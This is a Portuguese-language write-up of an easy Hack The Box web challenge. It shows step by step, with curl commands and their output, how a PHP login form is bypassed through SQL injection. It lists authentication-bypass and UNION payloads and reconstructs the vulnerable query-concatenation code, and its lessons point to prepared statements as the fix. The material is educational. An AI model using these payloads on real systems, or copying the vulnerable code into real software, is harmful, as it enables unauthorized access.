# 🕸️ SQL Injection Básico — Bypass de Autenticação

| Campo         | Valor                                      |
|---------------|--------------------------------------------|
| **Categoria** | Web                                        |
| **Dificuldade** | ★☆☆☆☆ (Fácil)                           |
| **Plataforma** | Hack The Box — Challenge "AuthBypass"     |
| **Data**       | 2024-03-15                                |

---

## Descrição do Desafio

O desafio apresenta um site de login corporativo — aparentemente um painel de administração de uma intranet fictícia. A página contém um formulário com campos `username` e `password` e, ao inspecionar o código-fonte, não há JavaScript ofuscado nem nada complexo. A dica dos organizadores: *"O administrador esqueceu de validar a entrada…"*.

A página parece rodar PHP + MySQL. O objetivo é **logar como admin sem saber a senha** e capturar a flag no dashboard.

```
  ╔══════════════════════════════════╗
  ║   INTRANET ACESSO RESTRITO       ║
  ║   ─────────────────────────────   ║
  ║                                   ║
  ║   👤 Usuário: [______________]    ║
  ║   🔑 Senha:   [______________]    ║
  ║                                   ║
  ║   [ LOGIN ]                      ║
  ║                                   ║
  ║   Acesso apenas para funcionários ║
  ║   autorizados.                   ║
  ╚══════════════════════════════════╝
```

---

## Enumeração

Primeiro, comecei com um reconhecimento básico.

```bash
# Descobrir tecnologias por trás da página
curl -s -I http://authbypass.htb/ | grep -i "server\|x-powered-by"
```

Saída:
```
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.33
```

Depois, visualizei o HTML da página de login em busca de pistas:

```bash
curl -s http://authbypass.htb/ | grep -i "form\|input\|action\|method"
```

Saída:
```html
<form action="login.php" method="POST">
  <input type="text"     name="username" placeholder="Usuário">
  <input type="password" name="password" placeholder="Senha">
  <button type="submit">Entrar</button>
</form>
```

A requisição vai para `login.php` via POST. Sem proteção visível (CSRF token, rate-limit, WAF). Testei campos com aspas simples para ver se quebrava:

```bash
curl -s 'http://authbypass.htb/login.php' \
  -d "username=admin'&password=admin"
```

Retorno:
```
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc()
on boolean in /var/www/html/login.php:12
```

**Bingo!** O erro prova que a query SQL está montada com concatenação direta — clássica vulnerabilidade de SQL Injection. O banco interpretou minha aspa e a query quebrou.

---

## Exploração — Passo a Passo

### 1. Teste de fechamento de string

Sabendo que o `username` é vulnerável, tentei comentar o resto da query:

```bash
curl -s 'http://authbypass.htb/login.php' \
  -d "username=admin'-- -&password=qualquer"
```

(A sintaxe `-- -` é o comentário SQL padrão MySQL com um espaço extra.)

Resposta:
```
Login inválido.
```

Não logou, mas parou de dar erro fatal — o comentário funcionou. Só que a query ainda está verificando `password` em algum lugar.

### 2. Bypass lógico com `OR`

Se a query original é algo como:

```sql
SELECT * FROM usuarios WHERE username='$user' AND password='$pass'
```

Posso injetar no `username` uma condição `OR` que seja sempre verdadeira:

```
' OR '1'='1' -- -
```

```bash
curl -s 'http://authbypass.htb/login.php' \
  -d "username=' OR '1'='1' -- -&password=whatever"
```

Resposta:
```
Bem-vindo, admin! Sua flag: HTB{sql1_1nj3ct10n_101}
```

**Flag capturada!**

---

## Payloads Utilizados

| Payload                                      | Efeito                          |
|----------------------------------------------|----------------------------------|
| `admin'`                                     | Quebra a query, confirma SQLi   |
| `admin'-- -`                                  | Comenta o resto, testa injeção  |
| `' OR '1'='1' -- -`                          | Bypass total de autenticação    |
| `admin' OR 1=1-- -`                          | Alternativa sem aspas          |
| `" OR 1=1-- -`                               | Caso o campo use aspas duplas   |
| `admin' UNION SELECT 1,'a','b'-- -`          | Teste inicial de UNION          |

---

## Screenshot em ASCII do Resultado

```
  ╔══════════════════════════════════╗
  ║   PAINEL ADMIN — INTRANET        ║
  ║   ─────────────────────────────   ║
  ║                                   ║
  ║   ✅ Login bem-sucedido!         ║
  ║                                   ║
  ║   👤 Usuário: admin              ║
  ║   🏁 Flag: HTB{sql1_1nj3ct10n_101} ║
  ║                                   ║
  ║   ⚠️ Troque sua senha imediatamente ║
  ╚══════════════════════════════════╝
```

---

## Código Vulnerável (reconstruído)

```php
<?php
$user = $_POST['username'];
$pass = $_POST['password'];

$sql = "SELECT * FROM usuarios WHERE username='$user' AND password='$pass'";
$result = $conn->query($sql);

if ($result->fetch_assoc()) {
    echo "Bem-vindo, admin! Sua flag: " . $flag;
} else {
    echo "Login inválido.";
}
?>
```

Três erros clássicos:
1. **Nenhuma validação de entrada** (`$_POST` direto na query).
2. **Concatenação de strings** em vez de prepared statements.
3. **Exposição da flag** se qualquer linha for retornada.

---

## Lições Aprendidas

1. **Sempre suspeite de formulários de login** — é o lugar mais comum para SQLi em challenges de CTF.
2. **Erros de banco são seus amigos** — um `Fatal Error` entregou a vulnerabilidade de bandeja.
3. **Comentários SQL** (`-- -`, `#`, `/*`) são essenciais para ignorar o resto da query.
4. **O operador `OR` com condição sempre verdadeira** é o bypass mais rápido de autenticação.
5. **Em cenários reais:** a proteção correta é usar **prepared statements** com PDO ou MySQLi.

---

## Flag

```
HTB{sql1_1nj3ct10n_101}
```

---

## Referências

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [TryHackMe — SQL Injection Lab](https://tryhackme.com/room/sqlinjectionlm)
